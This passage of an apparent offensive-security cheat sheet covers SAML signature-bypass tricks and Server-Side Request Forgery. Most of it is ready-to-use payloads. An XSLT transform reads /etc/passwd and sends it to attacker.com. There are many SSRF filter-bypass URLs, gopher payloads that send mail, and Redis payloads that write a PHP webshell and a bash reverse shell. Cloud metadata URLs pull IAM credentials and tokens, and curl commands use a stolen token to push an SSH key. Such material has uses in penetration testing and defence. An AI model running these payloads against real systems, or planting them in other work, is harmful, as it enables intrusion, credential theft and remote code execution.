multiple signatures, or behave differently depending on the order of assertions.\nXSW1 – Applies to SAML Response messages. Add a cloned unsigned copy of the Response after the existing signature. XSW2 – Applies to SAML Response messages. Add a cloned unsigned copy of the Response before the existing signature. XSW3 – Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion before the existing Assertion. XSW4 – Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion within the existing Assertion. XSW5 – Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed at the end of the SAML message. XSW6 – Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed after the original signature. XSW7 – Applies to SAML Assertion messages. Add an “Extensions” block with a cloned unsigned assertion. XSW8 – Applies to SAML Assertion messages. Add an “Object” block containing a copy of the original assertion with the signature removed. In the following example, these terms are used.\nFA: Forged Assertion LA: Legitimate Assertion LAS: Signature of the Legitimate Assertion \u0026lt;SAMLResponse\u0026gt; \u0026lt;FA ID=\u0026#34;evil\u0026#34;\u0026gt; \u0026lt;Subject\u0026gt;Attacker\u0026lt;/Subject\u0026gt; \u0026lt;/FA\u0026gt; \u0026lt;LA ID=\u0026#34;legitimate\u0026#34;\u0026gt; \u0026lt;Subject\u0026gt;Legitimate User\u0026lt;/Subject\u0026gt; \u0026lt;LAS\u0026gt; \u0026lt;Reference Reference URI=\u0026#34;legitimate\u0026#34;\u0026gt; \u0026lt;/Reference\u0026gt; \u0026lt;/LAS\u0026gt; \u0026lt;/LA\u0026gt; \u0026lt;/SAMLResponse\u0026gt; In the Github Enterprise vulnerability, this request would verify and create a sessions for Attacker instead of Legitimate User, even if FA is not signed.\nXML Comment Handling # A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual’s SSO password. This vulnerability has multiple CVE in the following libraries and products.\nOneLogin - python-saml - CVE-2017-11427 OneLogin - ruby-saml - CVE-2017-11428 Clever - saml2-js - CVE-2017-11429 OmniAuth-SAML - CVE-2017-11430 Shibboleth - CVE-2018-0489 Duo Network Gateway - CVE-2018-7340 Researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user\u0026rsquo;s account.\n\u0026lt;SAMLResponse\u0026gt; \u0026lt;Issuer\u0026gt;https://idp.com/\u0026lt;/Issuer\u0026gt; \u0026lt;Assertion ID=\u0026#34;_id1234\u0026#34;\u0026gt; \u0026lt;Subject\u0026gt; \u0026lt;NameID\u0026gt;user@user.com\u0026lt;!--XMLCOMMENT--\u0026gt;.evil.com\u0026lt;/NameID\u0026gt; Where user@user.com is the first part of the username, and .evil.com is the second.\nXML External Entity # An alternative exploitation would use XML entities to bypass the signature verification, since the content will not change, except during XML parsing.\nIn the following example:\n\u0026amp;s; will resolve to the string \u0026quot;s\u0026quot; \u0026amp;f1; will resolve to the string \u0026quot;f1\u0026quot; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE Response [ \u0026lt;!ENTITY s \u0026#34;s\u0026#34;\u0026gt; \u0026lt;!ENTITY f1 \u0026#34;f1\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;saml2p:Response xmlns:saml2p=\u0026#34;urn:oasis:names:tc:SAML:2.0:protocol\u0026#34; Destination=\u0026#34;https://idptestbed/Shibboleth.sso/SAML2/POST\u0026#34; ID=\u0026#34;_04cfe67e596b7449d05755049ba9ec28\u0026#34; InResponseTo=\u0026#34;_dbbb85ce7ff81905a3a7b4484afb3a4b\u0026#34; IssueInstant=\u0026#34;2017-12-08T15:15:56.062Z\u0026#34; Version=\u0026#34;2.0\u0026#34;\u0026gt; [...] \u0026lt;saml2:Attribute FriendlyName=\u0026#34;uid\u0026#34; Name=\u0026#34;urn:oid:0.9.2342.19200300.100.1.1\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:uri\u0026#34;\u0026gt; \u0026lt;saml2:AttributeValue\u0026gt; \u0026amp;s;taf\u0026amp;f1; \u0026lt;/saml2:AttributeValue\u0026gt; \u0026lt;/saml2:Attribute\u0026gt; [...] \u0026lt;/saml2p:Response\u0026gt; The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports \u0026ldquo;taf\u0026rdquo; as the value of the \u0026ldquo;uid\u0026rdquo; attribute.\nExtensible Stylesheet Language Transformation # An XSLT can be carried out by using the transform element.\nPicture from http://sso-attacks.org/XSLT_Attack\n\u0026lt;ds:Signature xmlns:ds=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u0026gt; ... \u0026lt;ds:Transforms\u0026gt; \u0026lt;ds:Transform\u0026gt; \u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;doc\u0026#34;\u0026gt; \u0026lt;xsl:variable name=\u0026#34;file\u0026#34; select=\u0026#34;unparsed-text(\u0026#39;/etc/passwd\u0026#39;)\u0026#34;/\u0026gt; \u0026lt;xsl:variable name=\u0026#34;escaped\u0026#34; select=\u0026#34;encode-for-uri($file)\u0026#34;/\u0026gt; \u0026lt;xsl:variable name=\u0026#34;attackerUrl\u0026#34; select=\u0026#34;\u0026#39;http://attacker.com/\u0026#39;\u0026#34;/\u0026gt; \u0026lt;xsl:variable name=\u0026#34;exploitUrl\u0026#34;select=\u0026#34;concat($attackerUrl,$escaped)\u0026#34;/\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;unparsed-text($exploitUrl)\u0026#34;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; \u0026lt;/ds:Transform\u0026gt; \u0026lt;/ds:Transforms\u0026gt; ... \u0026lt;/ds:Signature\u0026gt; References # SAML Burp Extension - ROLAND BISCHOFBERGER - JULY 24, 2015 The road to your codebase is paved with forged assertions - @ilektrojohn - March 13, 2017 SAML_Security_Cheat_Sheet.md - OWASP On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen Making Headlines: SAML - March 19, 2018 - Torsten George Vulnerability Note VU#475445 - 2018-02-27 - Carnegie Mellon University ORACLE WEBLOGIC - MULTIPLE SAML VULNERABILITIES (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - Jul 18, 2018 Truncation of SAML Attributes in Shibboleth 2 - 2018-01-15 - redteam-pentesting.de Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - March 7th, 2017 - Jem Jensen How to Hunt Bugs in SAML; a Methodology - Part I - @epi052 How to Hunt Bugs in SAML; a Methodology - Part II - @epi052 How to Hunt Bugs in SAML; a Methodology - Part III - @epi052 "},{"id":64,"href":"/docs/server_side_request_forgery/","title":"Server-Side Request Forgery","section":"Docs","content":" Server-Side Request Forgery # Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.\nTools # SSRFmap - https://github.com/swisskyrepo/SSRFmap Gopherus - https://github.com/tarunkant/Gopherus See-SURF - https://github.com/In3tinct/See-SURF SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff Payloads with localhost # Basic SSRF v1\nhttp://127.0.0.1:80 http://127.0.0.1:443 http://127.0.0.1:22 http://0.0.0.0:80 http://0.0.0.0:443 http://0.0.0.0:22 Basic SSRF - Alternative version\nhttp://localhost:80 http://localhost:443 http://localhost:22 Bypassing filters # Bypass using HTTPS # https://127.0.0.1/ https://localhost/ Bypass localhost with [::] # http://[::]:80/ http://[::]:25/ SMTP http://[::]:22/ SSH http://[::]:3128/ Squid http://0000::1:80/ http://0000::1:25/ SMTP http://0000::1:22/ SSH http://0000::1:3128/ Squid Bypass localhost with a domain redirection # http://spoofed.burpcollaborator.net http://localtest.me http://customer1.app.localhost.my.company.127.0.0.1.nip.io http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost http://bugbounty.dod.network redirect to 127.0.0.2 == localhost The service nip.io is awesome for that, it will convert any ip address as a dns.\nNIP.IO maps \u0026lt;anything\u0026gt;.\u0026lt;IP Address\u0026gt;.nip.io to the corresponding \u0026lt;IP Address\u0026gt;, even 127.0.0.1.nip.io maps to 127.0.0.1 Bypass localhost with CIDR # It\u0026rsquo;s a /8\nhttp://127.127.127.127 http://127.0.1.3 http://127.0.0.0 Bypass using a decimal IP location # http://2130706433/ = http://127.0.0.1 http://3232235521/ = http://192.168.0.1 http://3232235777/ = http://192.168.1.1 http://2852039166/ = http://169.254.169.254 Bypass using octal IP # Implementations differ on how to handle octal format of ipv4.\nhttp://0177.0.0.1/ = http://127.0.0.1 http://o177.0.0.1/ = http://127.0.0.1 http://0o177.0.0.1/ = http://127.0.0.1 http://q177.0.0.1/ = http://127.0.0.1 ... Ref:\nDEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards \u0026amp; pwning IPv4 parsing AppSecEU15-Server_side_browsing_considered_harmful.pdf Bypass using IPv6/IPv4 Address Embedding # IPv6/IPv4 Address Embedding\nhttp://[0:0:0:0:0:ffff:127.0.0.1] Bypass using malformed urls # localhost:+11211aaa localhost:00011211aaaa Bypass using rare address # You can short-hand IP addresses by dropping the zeros\nhttp://0/ http://127.1 http://127.0.1 Bypass using URL encoding # Single or double encode a specific URL to bypass blacklist\nhttp://127.0.0.1/%61dmin http://127.0.0.1/%2561dmin Bypass using bash variables # (curl only)\ncurl -v \u0026#34;http://evil$google.com\u0026#34; $google = \u0026#34;\u0026#34; Bypass using tricks combination # http://1.1.1.1 \u0026amp;@2.2.2.2# @3.3.3.3/ urllib2 : 1.1.1.1 requests + browsers : 2.2.2.2 urllib : 3.3.3.3 Bypass using enclosed alphanumerics # @EdOverflow\nhttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ Bypass using unicode # In some languages (.NET, Python 3) regex supports unicode by default. \\d includes 0123456789 but also ๐๑๒๓๔๕๖๗๘๙.\nBypass filter_var() php function # 0://evil.com:80;http://google.com:80/ Bypass against a weak parser # by Orange Tsai (Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)\nhttp://127.1.1.1:80\\@127.2.2.2:80/ http://127.1.1.1:80\\@@127.2.2.2:80/ http://127.1.1.1:80:\\@@127.2.2.2:80/ http://127.1.1.1:80#\\@127.2.2.2:80/ Bypassing using a redirect # using a redirect\n1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1) 2. Launch the SSRF pointing to vulnerable.com/index.php?url=http://YOUR_SERVER_IP vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1 3. You can use response codes [307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection. Bypassing using type=url # Change \u0026#34;type=file\u0026#34; to \u0026#34;type=url\u0026#34; Paste URL in text field and hit enter Using this vulnerability users can upload images from any image URL = trigger an SSRF Bypassing using DNS Rebinding (TOCTOU) # Create a domain that change between two IPs. http://1u.ms/ exists for this purpose. For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain: make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms Bypassing using jar protocol (java only) # Blind SSRF\njar:scheme://domain/path!/ jar:http://127.0.0.1!/ jar:https://127.0.0.1!/ jar:ftp://127.0.0.1!/ SSRF exploitation via URL Scheme # File # Allows an attacker to fetch the content of a file on the server\nfile://path/to/file file:///etc/passwd file://\\/\\/etc/passwd ssrf.php?url=file:///etc/passwd HTTP # Allows an attacker to fetch any content from the web, it can also be used to scan ports.\nssrf.php?url=http://127.0.0.1:22 ssrf.php?url=http://127.0.0.1:80 ssrf.php?url=http://127.0.0.1:443 The following URL scheme can be used to probe the network\nDict # The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:\ndict://\u0026lt;user\u0026gt;;\u0026lt;auth\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/d:\u0026lt;word\u0026gt;:\u0026lt;database\u0026gt;:\u0026lt;n\u0026gt; ssrf.php?url=dict://attacker:11111/ SFTP # A network protocol used for secure file transfer over secure shell\nssrf.php?url=sftp://evil.com:11111/ TFTP # Trivial File Transfer Protocol, works over UDP\nssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET LDAP # Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.\nssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher # ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a will make a request like HELO localhost MAIL FROM:\u0026lt;hacker@site.com\u0026gt; RCPT TO:\u0026lt;victim@site.com\u0026gt; DATA From: [Hacker] \u0026lt;hacker@site.com\u0026gt; To: \u0026lt;victime@site.com\u0026gt; Date: Tue, 15 Sep 2017 17:20:26 -0400 Subject: Ah Ah AH You didn\u0026#39;t say the magic word ! . QUIT Gopher HTTP # gopher://\u0026lt;proxyserver\u0026gt;:8080/_GET http://\u0026lt;attacker:80\u0026gt;/x HTTP/1.1%0A%0A gopher://\u0026lt;proxyserver\u0026gt;:8080/_POST%20http://\u0026lt;attacker\u0026gt;:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body Gopher SMTP - Back connect to 1337 # Content of evil.com/redirect.php: \u0026lt;?php header(\u0026#34;Location: gopher://hack3r.site:1337/_SSRF%0ATest!\u0026#34;); ?\u0026gt; Now query it. https://example.com/?q=http://evil.com/redirect.php. Gopher SMTP - send a mail # Content of evil.com/redirect.php: \u0026lt;?php $commands = array( \u0026#39;HELO victim.com\u0026#39;, \u0026#39;MAIL FROM: \u0026lt;admin@victim.com\u0026gt;\u0026#39;, \u0026#39;RCPT To: \u0026lt;sxcurity@oou.us\u0026gt;\u0026#39;, \u0026#39;DATA\u0026#39;, \u0026#39;Subject: @sxcurity!\u0026#39;, \u0026#39;Corben was here, woot woot!\u0026#39;, \u0026#39;.\u0026#39; ); $payload = implode(\u0026#39;%0A\u0026#39;, $commands); header(\u0026#39;Location: gopher://0:25/_\u0026#39;.$payload); ?\u0026gt; Netdoc # Wrapper for Java when your payloads struggle with \u0026ldquo;\\n\u0026rdquo; and \u0026ldquo;\\r\u0026rdquo; characters.\nssrf.php?url=netdoc:///etc/passwd SSRF exploiting WSGI # Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.\ngopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py Header modifier1 (1 byte) 0 (%00) datasize (2 bytes) 26 (%1A%00) modifier2 (1 byte) 0 (%00) Variable (UWSGI_FILE) key length (2 bytes) 10 (%0A%00) key data (m bytes) UWSGI_FILE value length (2 bytes) 12 (%0C%00) value data (n bytes) /tmp/test.py SSRF exploiting Redis # Redis is a database system that stores everything in RAM\n# Getting a webshell url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php url=dict://127.0.0.1:6379/SET%20mykey%20\u0026#34;\u0026lt;\\x3Fphp system($_GET[0])\\x3F\u0026gt;\u0026#34; url=dict://127.0.0.1:6379/SAVE # Getting a PHP reverse shell gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22 gopher://127.0.0.1:6379/_save SSRF exploiting PDF file # Example with WeasyPrint by @nahamsec\n\u0026lt;link rel=attachment href=\u0026#34;file:///root/secret.txt\u0026#34;\u0026gt; Example with PhantomJS\n\u0026lt;script\u0026gt; exfil = new XMLHttpRequest(); exfil.open(\u0026#34;GET\u0026#34;,\u0026#34;file:///etc/passwd\u0026#34;); exfil.send(); exfil.onload = function(){document.write(this.responseText);} exfil.onerror = function(){document.write(\u0026#39;failed!\u0026#39;)} \u0026lt;/script\u0026gt; Blind SSRF # When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read.\nUse an SSRF chain to gain an Out-of-Band output.\nFrom https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.com/assetnote/blind-ssrf-chains\nPossible via HTTP(s)\nElasticsearch Weblogic Hashicorp Consul Shellshock Apache Druid Apache Solr PeopleSoft Apache Struts JBoss Confluence Jira Other Atlassian Products OpenTSDB Jenkins Hystrix Dashboard W3 Total Cache Docker Gitlab Prometheus Redis Exporter Possible via Gopher\nRedis Memcache Apache Tomcat SSRF to XSS # by @D0rkerDevil \u0026amp; @alyssa.o.herrera\nhttp://brutelogic.com.br/poc.svg -\u0026gt; simple alert https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -\u0026gt; simple ssrf https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg SSRF from XSS # Using an iframe # The content of the file will be integrated inside the PDF as an image or text.\n\u0026lt;img src=\u0026#34;echopwn\u0026#34; onerror=\u0026#34;document.write(\u0026#39;\u0026lt;iframe src=file:///etc/passwd\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;)\u0026#34;/\u0026gt; Using an attachment # Example of a PDF attachment using HTML\nuse \u0026lt;link rel=attachment href=\u0026quot;URL\u0026quot;\u0026gt; as Bio text use \u0026lsquo;Download Data\u0026rsquo; feature to get PDF use pdfdetach -saveall filename.pdf to extract embedded resource cat attachment.bin SSRF URL for Cloud Instances # SSRF URL for AWS Bucket # Docs Interesting path to look for at http://169.254.169.254 or http://instance-data\nAlways here : /latest/meta-data/{hostname,public-ipv4,...} User data (startup script for auto-scaling) : /latest/user-data Temporary AWS credentials : /latest/meta-data/iam/security-credentials/ DNS record\nhttp://instance-data http://169.254.169.254 http://169.254.169.254.nip.io/ HTTP redirect\nStatic:http://nicob.net/redir6a Dynamic:http://nicob.net/redir-http-169.254.169.254:80- Alternate IP encoding\nhttp://425.510.425.510/ Dotted decimal with overflow http://2852039166/ Dotless decimal http://7147006462/ Dotless decimal with overflow http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal http://0xA9FEA9FE/ Dotless hexadecimal http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow http://0251.0376.0251.0376/ Dotted octal http://0251.00376.000251.0000376/ Dotted octal with padding http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal) More urls to include\nhttp://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/ http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access http://169.254.169.254/latest/dynamic/instance-identity/document AWS SSRF Bypasses\nConverted Decimal IP: http://2852039166/latest/meta-data/ IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/ IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/ IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/ E.g: Jira SSRF leading to AWS info disclosure - https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance\nE.g2: Flaws challenge - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/\nSSRF URL for AWS ECS # If you have an SSRF with file system access on an ECS instance, try extracting /proc/self/environ to get UUID.\ncurl http://169.254.170.2/v2/credentials/\u0026lt;UUID\u0026gt; This way you\u0026rsquo;ll extract IAM keys of the attached role\nSSRF URL for AWS Elastic Beanstalk # We retrieve the accountId and region from the API.\nhttp://169.254.169.254/latest/dynamic/instance-identity/document http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role We then retrieve the AccessKeyId, SecretAccessKey, and Token from the API.\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role Then we use the credentials with aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/.\nSSRF URL for AWS Lambda # AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.\nhttp://localhost:9001/2018-06-01/runtime/invocation/next $ curl \u0026#34;http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\u0026#34; Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next\nSSRF URL for Google Cloud # :warning: Google is shutting down support for usage of the v1 metadata service on January 15.\nRequires the header \u0026ldquo;Metadata-Flavor: Google\u0026rdquo; or \u0026ldquo;X-Google-Metadata-Request: True\u0026rdquo;\nhttp://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id Google allows recursive pulls\nhttp://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)\nhttp://metadata.google.internal/computeMetadata/v1beta1/ http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true Required headers can be set using a gopher SSRF with the following technique\ngopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a Interesting files to pull out:\nSSH Public Key : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json Get Access Token : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token Kubernetes Key : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json Add an SSH key # Extract the token\nhttp://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json Check the scope of the token\n$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA { \u0026#34;issued_to\u0026#34;: \u0026#34;101302079XXXXX\u0026#34;, \u0026#34;audience\u0026#34;: \u0026#34;10130207XXXXX\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\u0026#34;, \u0026#34;expires_in\u0026#34;: 2443, \u0026#34;access_type\u0026#34;: \u0026#34;offline\u0026#34; } Now push the SSH key.\ncurl -X POST \u0026#34;https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\u0026#34; -H \u0026#34;Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; --data \u0026#39;{\u0026#34;items\u0026#34;: [{\u0026#34;key\u0026#34;: \u0026#34;sshkeyname\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;sshkeyvalue\u0026#34;}]}\u0026#39; SSRF URL for Digital Ocean # Documentation available at https://developers.digitalocean.com/documentation/metadata/\ncurl http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address All in one request: curl http://169.254.169.254/metadata/v1.json | jq SSRF URL for Packetcloud # Documentation available at https://metadata.packet.net/userdata\nSSRF URL for Azure # Limited, maybe more exists? https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/\nhttp://169.254.169.254/metadata/v1/maintenance Update Apr 2017, Azure has more support; requires the header \u0026ldquo;Metadata: true\u0026rdquo; https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service\nhttp://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02\u0026amp;format=text SSRF URL for OpenStack/RackSpace # (header required? unknown)\nhttp://169.254.169.254/openstack SSRF URL for HP Helion # (header required? unknown)\nhttp://169.254.169.254/2009-04-04/meta-data/ SSRF URL for Oracle Cloud # http://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/ SSRF URL for Alibaba # http://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id SSRF URL for Kubernetes ETCD # Can contain API keys and internal ip and ports\ncurl -L http://127.0.0.1:2379/version curl http://127.0.0.1:2379/v2/keys/?recursive=true SSRF URL for Docker # http://127.0.0.1:2375/v1.24/containers/json Simple example docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json More info:\nDaemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option Docker Engine API: https://docs.docker.com/engine/api/latest/ SSRF URL for Rancher # curl http://rancher-metadata/\u0026lt;version\u0026gt;/\u0026lt;path\u0026gt; More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/\nReferences # AppSecEU15-Server_side_browsing_considered_harmful.pdf Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - 2017-12-13 ESEA Server-Side Request Forgery and Querying AWS Meta Data by Brett Buerhaus SSRF and local file read in video to gif converter SSRF in https://imgur.com/vidgif/url SSRF in proxy.duckduckgo.com Blind SSRF on errors.hackerone.net SSRF on *shopifycloud.com Hackerone - How To: Server-Side Request Forgery (SSRF) Awesome URL abuse for SSRF by @orange_8361 #BHUSA How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai #HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai SSRF Tips - xl7dev SSRF in https://imgur.com/vidgif/url Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat AppSecEU15 Server side browsing considered harmful - @Agarri Enclosed alphanumerics - @EdOverflow Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity PHP SSRF @secjuice How I convert SSRF to xss in a ssrf vulnerable Jira Piercing the Veil: Server Side Request Forgery to NIPRNet access Hacker101 SSRF SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019 SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang 